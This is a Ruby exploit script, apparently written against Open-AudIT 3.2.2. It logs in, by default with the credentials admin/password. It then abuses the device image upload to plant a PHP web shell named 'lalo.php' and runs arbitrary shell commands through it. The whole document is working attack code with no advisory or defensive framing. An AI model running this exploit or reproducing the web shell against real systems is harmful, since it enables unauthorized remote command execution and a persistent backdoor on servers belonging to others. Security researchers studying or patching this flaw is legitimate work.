#!/usr/bin/env ruby -W0
# Open-AudIT  version 3.2.2

require 'rex'
require 'rex/mime'
require 'json'

host = ARGV[0]
user = ARGV[1] || "admin"
pass = ARGV[2] || "password"
cmd  = ARGV[3] || "uname -a;id"

def usage
 puts "[*] #{$0} <host> <user> <password> [cmd]"
 exit
end

usage if ARGV.size < 1

begin
login = %Q|redirect_url=%2Fen%2Fomk%2Fopen-audit=&username=#{user}&password=#{pass}|

sock = Rex::Proto::Http::Client.new(host, 
                                    port = "80", 
                                    context = {}, ssl = false)

req = sock.request_cgi(
{
	'uri'     => "/en/omk/open-audit/login",
	'version' => '1.0',
	'method'  => 'POST',
        'headers' => {
           'x-requested-with' => 'XMLHttpRequest',
           'DNT' => '1',
           'Connection' => 'close',
        },
        'data'    => login,
})

sock.send_request(req)
data = sock.read_response()

 if data and data.code == 302
  omk = data.get_cookies

php =%Q|<?php
if(isset($_REQUEST['cmd'])){
        $cmd = ($_REQUEST['cmd']);
        system($cmd);
        die;
}?>
|

  dbl = Rex::MIME::Message.new
  dbl.add_part("", nil, nil, "form-data; name=\"data[access_token]\"")
  dbl.add_part("1", nil, nil, "form-data; name=\"id\"")
  dbl.add_part("image", nil, nil, "form-data; name=\"data[attributes][name]\"")
  dbl.add_part("", nil, nil, "form-data; name=\"data[attributes][filename]\"")
  dbl.add_part(php, "application/zip", nil, "form-data; name=\"attachment\";filename=\"lalo.php\"")
  dbl.add_part("front", nil, nil, "form-data; name=\"data[attributes][orientation]\"")
  dbl.add_part("", nil, nil, "form-data; name=\"submit\"") # Here
  form = dbl.to_s


  req = sock.request_cgi(
  {
        'uri'     => "/en/omk/open-audit/devices/1/image/create",
        'version' => '1.0',
        'method'  => 'POST',
        'cookie'  => omk,
        'ctype'   => "multipart/form-data; boundary=#{dbl.bound}",
        'headers' => {
           'x-requested-with' => 'XMLHttpRequest',
           'DNT' => '1',
           'Connection' => 'close',
        },
        'data'    => form,
  })

  sock.send_request(req)
  data = sock.read_response()
  
   if data and data.code == 302

    cmds = Rex::Text.uri_encode(cmd)
    req = sock.request_raw(
    {
        'uri'     => "/open-audit/custom_images/lalo.php?cmd=#{cmds}",
        'version' => '1.0',
        'method'  => 'GET',
    })

   sock.send_request(req)
   data = sock.read_response()
   puts data.body
   else
    puts "[!] Error"
   end

 else
  puts "[!] Error"
 end
rescue => e
 puts "[!] #{e.to_s}"
end
